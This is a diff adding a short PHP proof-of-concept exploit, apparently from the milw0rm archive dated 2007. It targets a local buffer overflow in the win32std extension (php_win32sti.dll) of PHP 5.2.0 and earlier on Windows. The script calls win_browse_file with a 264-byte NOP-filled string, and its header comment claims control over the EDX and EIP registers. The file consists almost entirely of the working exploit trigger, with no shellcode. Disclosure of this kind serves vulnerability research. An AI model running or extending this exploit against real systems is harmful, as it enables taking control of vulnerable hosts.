@@ -1,0 +1,24 @@
+<?php
+// ==================================================================================
+//
+//        php_win32sti.dll PHP <= 5.2.0 (win32) Buffer Overflow
+//
+//		[x] Discovery: boecke <boecke@herzeleid.net>
+//		[x] Risk: Local Buffer Overflow (Medium - High Risk)
+//		[x] Notes: EDX and EIP are able to be controlled and therefore
+//			     have the potential to dictate program flow.
+//
+//		[x] "Sangre, sonando, de rabia naci.. Who do you trust?"
+//
+// ==================================================================================
+
+if ( !extension_loaded("win32std") )
+{
+	die;
+}
+
+win_browse_file( 1, NULL, str_repeat( "\x90", 264 ), NULL, array( "*" => "*.*" ) );
+
+?>
+
+# milw0rm.com [2007-08-18]
